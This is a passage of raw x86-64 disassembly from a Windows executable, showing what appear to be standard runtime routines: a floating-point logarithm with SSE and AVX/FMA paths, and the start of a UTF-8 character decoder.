   14000d8ae:	cc                   	int3
   14000d8af:	cc                   	int3
   14000d8b0:	48 83 ec 58          	sub    $0x58,%rsp
   14000d8b4:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   14000d8ba:	83 3d 93 e3 00 00 00 	cmpl   $0x0,0xe393(%rip)        # 0x14001bc54
   14000d8c1:	0f 85 e9 02 00 00    	jne    0x14000dbb0
   14000d8c7:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000d8cb:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000d8cf:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   14000d8d4:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000d8d9:	66 0f fb 1d 1f 85 00 	psubq  0x851f(%rip),%xmm3        # 0x140015e00
   14000d8e0:	00 
   14000d8e1:	66 0f 28 e8          	movapd %xmm0,%xmm5
   14000d8e5:	66 0f 54 2d e3 84 00 	andpd  0x84e3(%rip),%xmm5        # 0x140015dd0
   14000d8ec:	00 
   14000d8ed:	66 0f 2f 2d db 84 00 	comisd 0x84db(%rip),%xmm5        # 0x140015dd0
   14000d8f4:	00 
   14000d8f5:	0f 84 85 02 00 00    	je     0x14000db80
   14000d8fb:	66 0f 28 d0          	movapd %xmm0,%xmm2
   14000d8ff:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   14000d903:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   14000d907:	66 0f 2f c5          	comisd %xmm5,%xmm0
   14000d90b:	0f 86 2f 02 00 00    	jbe    0x14000db40
   14000d911:	66 0f db 15 07 85 00 	pand   0x8507(%rip),%xmm2        # 0x140015e20
   14000d918:	00 
   14000d919:	f2 0f 5c 25 8f 85 00 	subsd  0x858f(%rip),%xmm4        # 0x140015eb0
   14000d920:	00 
   14000d921:	66 0f 2f 35 17 86 00 	comisd 0x8617(%rip),%xmm6        # 0x140015f40
   14000d928:	00 
   14000d929:	0f 84 d8 01 00 00    	je     0x14000db07
   14000d92f:	66 0f 54 25 69 86 00 	andpd  0x8669(%rip),%xmm4        # 0x140015fa0
   14000d936:	00 
   14000d937:	4c 8b c8             	mov    %rax,%r9
   14000d93a:	48 23 05 ef 84 00 00 	and    0x84ef(%rip),%rax        # 0x140015e30
   14000d941:	4c 23 0d f8 84 00 00 	and    0x84f8(%rip),%r9        # 0x140015e40
   14000d948:	49 d1 e1             	shl    $1,%r9
   14000d94b:	49 03 c1             	add    %r9,%rax
   14000d94e:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000d953:	66 0f 2f 25 05 86 00 	comisd 0x8605(%rip),%xmm4        # 0x140015f60
   14000d95a:	00 
   14000d95b:	0f 82 df 00 00 00    	jb     0x14000da40
   14000d961:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000d965:	66 0f eb 15 53 85 00 	por    0x8553(%rip),%xmm2        # 0x140015ec0
   14000d96c:	00 
   14000d96d:	66 0f eb 0d 4b 85 00 	por    0x854b(%rip),%xmm1        # 0x140015ec0
   14000d974:	00 
   14000d975:	4c 8d 0d c4 96 00 00 	lea    0x96c4(%rip),%r9        # 0x140017040
   14000d97c:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   14000d980:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   14000d986:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000d98a:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000d98e:	4c 8d 0d 8b 86 00 00 	lea    0x868b(%rip),%r9        # 0x140016020
   14000d995:	f2 0f 10 1d 93 85 00 	movsd  0x8593(%rip),%xmm3        # 0x140015f30
   14000d99c:	00 
   14000d99d:	f2 0f 10 0d 5b 85 00 	movsd  0x855b(%rip),%xmm1        # 0x140015f00
   14000d9a4:	00 
   14000d9a5:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000d9a9:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000d9ad:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000d9b1:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000d9b5:	f2 0f 58 1d 63 85 00 	addsd  0x8563(%rip),%xmm3        # 0x140015f20
   14000d9bc:	00 
   14000d9bd:	f2 0f 58 0d 2b 85 00 	addsd  0x852b(%rip),%xmm1        # 0x140015ef0
   14000d9c4:	00 
   14000d9c5:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   14000d9c9:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000d9cd:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000d9d1:	f2 0f 58 1d 37 85 00 	addsd  0x8537(%rip),%xmm3        # 0x140015f10
   14000d9d8:	00 
   14000d9d9:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   14000d9dd:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   14000d9e1:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   14000d9e5:	f2 0f 10 2d a3 84 00 	movsd  0x84a3(%rip),%xmm5        # 0x140015e90
   14000d9ec:	00 
   14000d9ed:	f2 0f 59 0d 5b 84 00 	mulsd  0x845b(%rip),%xmm1        # 0x140015e50
   14000d9f4:	00 
   14000d9f5:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   14000d9f9:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   14000d9fd:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000da03:	48 8d 15 26 8e 00 00 	lea    0x8e26(%rip),%rdx        # 0x140016830
   14000da0a:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000da0f:	f2 0f 10 25 69 84 00 	movsd  0x8469(%rip),%xmm4        # 0x140015e80
   14000da16:	00 
   14000da17:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   14000da1b:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000da1f:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   14000da23:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   14000da27:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000da2d:	48 83 c4 58          	add    $0x58,%rsp
   14000da31:	c3                   	ret
   14000da32:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000da39:	1f 84 00 00 00 00 00 
   14000da40:	f2 0f 10 15 58 84 00 	movsd  0x8458(%rip),%xmm2        # 0x140015ea0
   14000da47:	00 
   14000da48:	f2 0f 5c 05 60 84 00 	subsd  0x8460(%rip),%xmm0        # 0x140015eb0
   14000da4f:	00 
   14000da50:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   14000da54:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000da58:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000da5c:	f2 0f 10 25 5c 85 00 	movsd  0x855c(%rip),%xmm4        # 0x140015fc0
   14000da63:	00 
   14000da64:	f2 0f 10 2d 74 85 00 	movsd  0x8574(%rip),%xmm5        # 0x140015fe0
   14000da6b:	00 
   14000da6c:	66 0f 28 f0          	movapd %xmm0,%xmm6
   14000da70:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   14000da74:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   14000da78:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000da7c:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000da80:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000da84:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000da88:	f2 0f 58 25 20 85 00 	addsd  0x8520(%rip),%xmm4        # 0x140015fb0
   14000da8f:	00 
   14000da90:	f2 0f 58 2d 38 85 00 	addsd  0x8538(%rip),%xmm5        # 0x140015fd0
   14000da97:	00 
   14000da98:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000da9c:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000daa0:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   14000daa4:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000daa8:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000daac:	f2 0f 10 15 bc 83 00 	movsd  0x83bc(%rip),%xmm2        # 0x140015e70
   14000dab3:	00 
   14000dab4:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   14000dab8:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   14000dabc:	f2 0f 10 35 9c 83 00 	movsd  0x839c(%rip),%xmm6        # 0x140015e60
   14000dac3:	00 
   14000dac4:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000dac8:	66 0f db 1d 20 85 00 	pand   0x8520(%rip),%xmm3        # 0x140015ff0
   14000dacf:	00 
   14000dad0:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   14000dad4:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   14000dad8:	66 0f 28 c3          	movapd %xmm3,%xmm0
   14000dadc:	66 0f 28 cc          	movapd %xmm4,%xmm1
   14000dae0:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000dae4:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000dae8:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   14000daec:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   14000daf0:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000daf4:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   14000daf8:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   14000dafc:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000db02:	48 83 c4 58          	add    $0x58,%rsp
   14000db06:	c3                   	ret
   14000db07:	66 0f eb 15 a1 83 00 	por    0x83a1(%rip),%xmm2        # 0x140015eb0
   14000db0e:	00 
   14000db0f:	f2 0f 5c 15 99 83 00 	subsd  0x8399(%rip),%xmm2        # 0x140015eb0
   14000db16:	00 
   14000db17:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   14000db1b:	66 0f db 15 fd 82 00 	pand   0x82fd(%rip),%xmm2        # 0x140015e20
   14000db22:	00 
   14000db23:	66 48 0f 7e d0       	movq   %xmm2,%rax
   14000db28:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   14000db2d:	66 0f fa 2d 1b 84 00 	psubd  0x841b(%rip),%xmm5        # 0x140015f50
   14000db34:	00 
   14000db35:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   14000db39:	e9 f1 fd ff ff       	jmp    0x14000d92f
   14000db3e:	66 90                	xchg   %ax,%ax
   14000db40:	75 1e                	jne    0x14000db60
   14000db42:	f2 0f 10 0d 76 82 00 	movsd  0x8276(%rip),%xmm1        # 0x140015dc0
   14000db49:	00 
   14000db4a:	44 8b 05 af 84 00 00 	mov    0x84af(%rip),%r8d        # 0x140016000
   14000db51:	e8 1a 0b 00 00       	call   0x14000e670
   14000db56:	eb 48                	jmp    0x14000dba0
   14000db58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000db5f:	00 
   14000db60:	f2 0f 10 0d 78 82 00 	movsd  0x8278(%rip),%xmm1        # 0x140015de0
   14000db67:	00 
   14000db68:	44 8b 05 95 84 00 00 	mov    0x8495(%rip),%r8d        # 0x140016004
   14000db6f:	e8 fc 0a 00 00       	call   0x14000e670
   14000db74:	eb 2a                	jmp    0x14000dba0
   14000db76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000db7d:	00 00 00 
   14000db80:	48 3b 05 49 82 00 00 	cmp    0x8249(%rip),%rax        # 0x140015dd0
   14000db87:	74 17                	je     0x14000dba0
   14000db89:	48 3b 05 30 82 00 00 	cmp    0x8230(%rip),%rax        # 0x140015dc0
   14000db90:	74 ce                	je     0x14000db60
   14000db92:	48 0b 05 57 82 00 00 	or     0x8257(%rip),%rax        # 0x140015df0
   14000db99:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000db9e:	66 90                	xchg   %ax,%ax
   14000dba0:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000dba6:	48 83 c4 58          	add    $0x58,%rsp
   14000dbaa:	c3                   	ret
   14000dbab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000dbb0:	48 33 c0             	xor    %rax,%rax
   14000dbb3:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   14000dbb8:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   14000dbbd:	c5 e1 fb 1d 3b 82 00 	vpsubq 0x823b(%rip),%xmm3,%xmm3        # 0x140015e00
   14000dbc4:	00 
   14000dbc5:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   14000dbc9:	c5 f9 db 2d ff 81 00 	vpand  0x81ff(%rip),%xmm0,%xmm5        # 0x140015dd0
   14000dbd0:	00 
   14000dbd1:	c5 f9 2f 2d f7 81 00 	vcomisd 0x81f7(%rip),%xmm5        # 0x140015dd0
   14000dbd8:	00 
   14000dbd9:	0f 84 41 02 00 00    	je     0x14000de20
   14000dbdf:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000dbe3:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   14000dbe7:	0f 86 e3 01 00 00    	jbe    0x14000ddd0
   14000dbed:	c5 f9 db 15 2b 82 00 	vpand  0x822b(%rip),%xmm0,%xmm2        # 0x140015e20
   14000dbf4:	00 
   14000dbf5:	c5 fb 5c 25 b3 82 00 	vsubsd 0x82b3(%rip),%xmm0,%xmm4        # 0x140015eb0
   14000dbfc:	00 
   14000dbfd:	c5 f9 2f 35 3b 83 00 	vcomisd 0x833b(%rip),%xmm6        # 0x140015f40
   14000dc04:	00 
   14000dc05:	0f 84 8e 01 00 00    	je     0x14000dd99
   14000dc0b:	c5 f9 db 0d 1d 82 00 	vpand  0x821d(%rip),%xmm0,%xmm1        # 0x140015e30
   14000dc12:	00 
   14000dc13:	c5 f9 db 1d 25 82 00 	vpand  0x8225(%rip),%xmm0,%xmm3        # 0x140015e40
   14000dc1a:	00 
   14000dc1b:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   14000dc20:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   14000dc24:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   14000dc29:	c5 d9 db 25 6f 83 00 	vpand  0x836f(%rip),%xmm4,%xmm4        # 0x140015fa0
   14000dc30:	00 
   14000dc31:	c5 f9 2f 25 27 83 00 	vcomisd 0x8327(%rip),%xmm4        # 0x140015f60
   14000dc38:	00 
   14000dc39:	0f 82 b1 00 00 00    	jb     0x14000dcf0
   14000dc3f:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000dc43:	c5 e9 eb 15 75 82 00 	vpor   0x8275(%rip),%xmm2,%xmm2        # 0x140015ec0
   14000dc4a:	00 
   14000dc4b:	c5 f1 eb 0d 6d 82 00 	vpor   0x826d(%rip),%xmm1,%xmm1        # 0x140015ec0
   14000dc52:	00 
   14000dc53:	4c 8d 0d e6 93 00 00 	lea    0x93e6(%rip),%r9        # 0x140017040
   14000dc5a:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   14000dc5e:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   14000dc64:	4c 8d 0d b5 83 00 00 	lea    0x83b5(%rip),%r9        # 0x140016020
   14000dc6b:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   14000dc6f:	c5 fb 10 1d b9 82 00 	vmovsd 0x82b9(%rip),%xmm3        # 0x140015f30
   14000dc76:	00 
   14000dc77:	c5 fb 10 2d 81 82 00 	vmovsd 0x8281(%rip),%xmm5        # 0x140015f00
   14000dc7e:	00 
   14000dc7f:	c4 e2 f1 a9 1d 98 82 	vfmadd213sd 0x8298(%rip),%xmm1,%xmm3        # 0x140015f20
   14000dc86:	00 00 
   14000dc88:	c4 e2 f1 a9 2d 2f 82 	vfmadd213sd 0x822f(%rip),%xmm1,%xmm5        # 0x140015ec0
   14000dc8f:	00 00 
   14000dc91:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   14000dc95:	c4 e2 f1 a9 1d 72 82 	vfmadd213sd 0x8272(%rip),%xmm1,%xmm3        # 0x140015f10
   14000dc9c:	00 00 
   14000dc9e:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   14000dca2:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   14000dca7:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   14000dcac:	c5 f3 59 0d 9c 81 00 	vmulsd 0x819c(%rip),%xmm1,%xmm1        # 0x140015e50
   14000dcb3:	00 
   14000dcb4:	c5 fb 10 2d d4 81 00 	vmovsd 0x81d4(%rip),%xmm5        # 0x140015e90
   14000dcbb:	00 
   14000dcbc:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   14000dcc1:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000dcc7:	48 8d 15 62 8b 00 00 	lea    0x8b62(%rip),%rdx        # 0x140016830
   14000dcce:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000dcd3:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   14000dcd7:	c4 e2 c9 b9 05 a0 81 	vfmadd231sd 0x81a0(%rip),%xmm6,%xmm0        # 0x140015e80
   14000dcde:	00 00 
   14000dce0:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   14000dce4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000dcea:	48 83 c4 58          	add    $0x58,%rsp
   14000dcee:	c3                   	ret
   14000dcef:	90                   	nop
   14000dcf0:	c5 fb 10 15 a8 81 00 	vmovsd 0x81a8(%rip),%xmm2        # 0x140015ea0
   14000dcf7:	00 
   14000dcf8:	c5 fb 5c 05 b0 81 00 	vsubsd 0x81b0(%rip),%xmm0,%xmm0        # 0x140015eb0
   14000dcff:	00 
   14000dd00:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   14000dd04:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   14000dd08:	c5 fb 10 25 b0 82 00 	vmovsd 0x82b0(%rip),%xmm4        # 0x140015fc0
   14000dd0f:	00 
   14000dd10:	c5 fb 10 2d c8 82 00 	vmovsd 0x82c8(%rip),%xmm5        # 0x140015fe0
   14000dd17:	00 
   14000dd18:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   14000dd1c:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   14000dd20:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   14000dd24:	c4 e2 e9 a9 25 83 82 	vfmadd213sd 0x8283(%rip),%xmm2,%xmm4        # 0x140015fb0
   14000dd2b:	00 00 
   14000dd2d:	c4 e2 e9 a9 2d 9a 82 	vfmadd213sd 0x829a(%rip),%xmm2,%xmm5        # 0x140015fd0
   14000dd34:	00 00 
   14000dd36:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000dd3a:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   14000dd3e:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   14000dd42:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000dd46:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   14000dd4a:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   14000dd4e:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   14000dd52:	c5 f9 db 1d 96 82 00 	vpand  0x8296(%rip),%xmm0,%xmm3        # 0x140015ff0
   14000dd59:	00 
   14000dd5a:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   14000dd5e:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   14000dd62:	c5 db 59 0d f6 80 00 	vmulsd 0x80f6(%rip),%xmm4,%xmm1        # 0x140015e60
   14000dd69:	00 
   14000dd6a:	c5 db 59 25 fe 80 00 	vmulsd 0x80fe(%rip),%xmm4,%xmm4        # 0x140015e70
   14000dd71:	00 
   14000dd72:	c5 e3 59 05 f6 80 00 	vmulsd 0x80f6(%rip),%xmm3,%xmm0        # 0x140015e70
   14000dd79:	00 
   14000dd7a:	c5 e3 59 1d de 80 00 	vmulsd 0x80de(%rip),%xmm3,%xmm3        # 0x140015e60
   14000dd81:	00 
   14000dd82:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   14000dd86:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   14000dd8a:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   14000dd8e:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000dd94:	48 83 c4 58          	add    $0x58,%rsp
   14000dd98:	c3                   	ret
   14000dd99:	c5 e9 eb 15 0f 81 00 	vpor   0x810f(%rip),%xmm2,%xmm2        # 0x140015eb0
   14000dda0:	00 
   14000dda1:	c5 eb 5c 15 07 81 00 	vsubsd 0x8107(%rip),%xmm2,%xmm2        # 0x140015eb0
   14000dda8:	00 
   14000dda9:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   14000ddae:	c5 e9 db 15 6a 80 00 	vpand  0x806a(%rip),%xmm2,%xmm2        # 0x140015e20
   14000ddb5:	00 
   14000ddb6:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   14000ddba:	c5 d1 fa 2d 8e 81 00 	vpsubd 0x818e(%rip),%xmm5,%xmm5        # 0x140015f50
   14000ddc1:	00 
   14000ddc2:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   14000ddc6:	e9 40 fe ff ff       	jmp    0x14000dc0b
   14000ddcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000ddd0:	75 2e                	jne    0x14000de00
   14000ddd2:	c5 fb 10 0d e6 7f 00 	vmovsd 0x7fe6(%rip),%xmm1        # 0x140015dc0
   14000ddd9:	00 
   14000ddda:	44 8b 05 1f 82 00 00 	mov    0x821f(%rip),%r8d        # 0x140016000
   14000dde1:	e8 8a 08 00 00       	call   0x14000e670
   14000dde6:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000ddec:	48 83 c4 58          	add    $0x58,%rsp
   14000ddf0:	c3                   	ret
   14000ddf1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000ddf8:	0f 1f 84 00 00 00 00 
   14000ddff:	00 
   14000de00:	c5 fb 10 0d d8 7f 00 	vmovsd 0x7fd8(%rip),%xmm1        # 0x140015de0
   14000de07:	00 
   14000de08:	44 8b 05 f5 81 00 00 	mov    0x81f5(%rip),%r8d        # 0x140016004
   14000de0f:	e8 5c 08 00 00       	call   0x14000e670
   14000de14:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000de1a:	48 83 c4 58          	add    $0x58,%rsp
   14000de1e:	c3                   	ret
   14000de1f:	90                   	nop
   14000de20:	48 3b 05 a9 7f 00 00 	cmp    0x7fa9(%rip),%rax        # 0x140015dd0
   14000de27:	74 27                	je     0x14000de50
   14000de29:	48 3b 05 90 7f 00 00 	cmp    0x7f90(%rip),%rax        # 0x140015dc0
   14000de30:	74 ce                	je     0x14000de00
   14000de32:	48 0b 05 b7 7f 00 00 	or     0x7fb7(%rip),%rax        # 0x140015df0
   14000de39:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000de3e:	44 8b 05 c3 81 00 00 	mov    0x81c3(%rip),%r8d        # 0x140016008
   14000de45:	e8 26 08 00 00       	call   0x14000e670
   14000de4a:	eb 04                	jmp    0x14000de50
   14000de4c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000de50:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000de56:	48 83 c4 58          	add    $0x58,%rsp
   14000de5a:	c3                   	ret
   14000de5b:	cc                   	int3
   14000de5c:	48 83 22 00          	andq   $0x0,(%rdx)
   14000de60:	48 8b c1             	mov    %rcx,%rax
   14000de63:	c3                   	ret
   14000de64:	48 83 21 00          	andq   $0x0,(%rcx)
   14000de68:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000de6c:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000de70:	c7 42 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rdx)
   14000de77:	c3                   	ret
   14000de78:	40 53                	rex push %rbx
   14000de7a:	55                   	push   %rbp
   14000de7b:	56                   	push   %rsi
   14000de7c:	57                   	push   %rdi
   14000de7d:	41 54                	push   %r12
   14000de7f:	41 56                	push   %r14
   14000de81:	41 57                	push   %r15
   14000de83:	48 83 ec 40          	sub    $0x40,%rsp
   14000de87:	48 8b 05 72 c1 00 00 	mov    0xc172(%rip),%rax        # 0x14001a000
   14000de8e:	48 33 c4             	xor    %rsp,%rax
   14000de91:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000de96:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   14000de9d:	00 
   14000de9e:	4c 8d 15 a3 dd 00 00 	lea    0xdda3(%rip),%r10        # 0x14001bc48
   14000dea5:	45 33 db             	xor    %r11d,%r11d
   14000dea8:	48 8d 3d e3 2c 00 00 	lea    0x2ce3(%rip),%rdi        # 0x140010b92
   14000deaf:	4d 85 c9             	test   %r9,%r9
   14000deb2:	48 8b c2             	mov    %rdx,%rax
   14000deb5:	4c 8b e2             	mov    %rdx,%r12
   14000deb8:	4d 0f 45 d1          	cmovne %r9,%r10
   14000debc:	48 85 d2             	test   %rdx,%rdx
   14000debf:	41 8d 6b 01          	lea    0x1(%r11),%ebp
   14000dec3:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000dec7:	44 8b fd             	mov    %ebp,%r15d
   14000deca:	4d 0f 45 f8          	cmovne %r8,%r15
   14000dece:	48 f7 d8             	neg    %rax
   14000ded1:	4d 1b f6             	sbb    %r14,%r14
   14000ded4:	4c 23 f1             	and    %rcx,%r14
   14000ded7:	4d 85 ff             	test   %r15,%r15
   14000deda:	75 0c                	jne    0x14000dee8
   14000dedc:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000dee3:	e9 4d 01 00 00       	jmp    0x14000e035
   14000dee8:	66 45 39 5a 06       	cmp    %r11w,0x6(%r10)
   14000deed:	75 68                	jne    0x14000df57
   14000deef:	44 0f b6 0f          	movzbl (%rdi),%r9d
   14000def3:	48 ff c7             	inc    %rdi
   14000def6:	45 84 c9             	test   %r9b,%r9b
   14000def9:	78 17                	js     0x14000df12
   14000defb:	4d 85 f6             	test   %r14,%r14
   14000defe:	74 03                	je     0x14000df03
   14000df00:	45 89 0e             	mov    %r9d,(%r14)
   14000df03:	45 84 c9             	test   %r9b,%r9b
   14000df06:	41 0f 95 c3          	setne  %r11b
   14000df0a:	49 8b c3             	mov    %r11,%rax
   14000df0d:	e9 23 01 00 00       	jmp    0x14000e035
   14000df12:	41 8a c1             	mov    %r9b,%al
   14000df15:	24 e0                	and    $0xe0,%al
   14000df17:	3c c0                	cmp    $0xc0,%al
   14000df19:	75 05                	jne    0x14000df20
   14000df1b:	41 b0 02             	mov    $0x2,%r8b
   14000df1e:	eb 1e                	jmp    0x14000df3e
   14000df20:	41 8a c1             	mov    %r9b,%al
   14000df23:	24 f0                	and    $0xf0,%al
   14000df25:	3c e0                	cmp    $0xe0,%al
   14000df27:	75 05                	jne    0x14000df2e
   14000df29:	41 b0 03             	mov    $0x3,%r8b
   14000df2c:	eb 10                	jmp    0x14000df3e
   14000df2e:	41 8a c1             	mov    %r9b,%al
   14000df31:	24 f8                	and    $0xf8,%al
   14000df33:	3c f0                	cmp    $0xf0,%al
   14000df35:	0f 85 ef 00 00 00    	jne    0x14000e02a
   14000df3b:	41 b0 04             	mov    $0x4,%r8b
   14000df3e:	41 0f b6 c0          	movzbl %r8b,%eax
   14000df42:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000df47:	2b c8                	sub    %eax,%ecx
   14000df49:	8b d5                	mov    %ebp,%edx
   14000df4b:	d3 e2                	shl    %cl,%edx
   14000df4d:	41 8a d8             	mov    %r8b,%bl
   14000df50:	2b d5                	sub    %ebp,%edx
   14000df52:	41 23 d1             	and    %r9d,%edx
   14000df55:	eb 29                	jmp    0x14000df80
   14000df57:	45 8a 42 04          	mov    0x4(%r10),%r8b
   14000df5b:	41 8b 12             	mov    (%r10),%edx
   14000df5e:	41 8a 5a 06          	mov    0x6(%r10),%bl
   14000df62:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000df66:	3c 02                	cmp    $0x2,%al
   14000df68:	0f 87 bc 00 00 00    	ja     0x14000e02a
   14000df6e:	40 3a dd             	cmp    %bpl,%bl
   14000df71:	0f 82 b3 00 00 00    	jb     0x14000e02a
   14000df77:	41 3a d8             	cmp    %r8b,%bl
   14000df7a:	0f 83 aa 00 00 00    	jae    0x14000e02a
   14000df80:	0f b6 eb             	movzbl %bl,%ebp
   14000df83:	49 3b ef             	cmp    %r15,%rbp
   14000df86:	44 8b cd             	mov    %ebp,%r9d
   14000df89:	4d 0f 43 cf          	cmovae %r15,%r9
   14000df8d:	eb 1e                	jmp    0x14000dfad
   14000df8f:	0f b6 0f             	movzbl (%rdi),%ecx
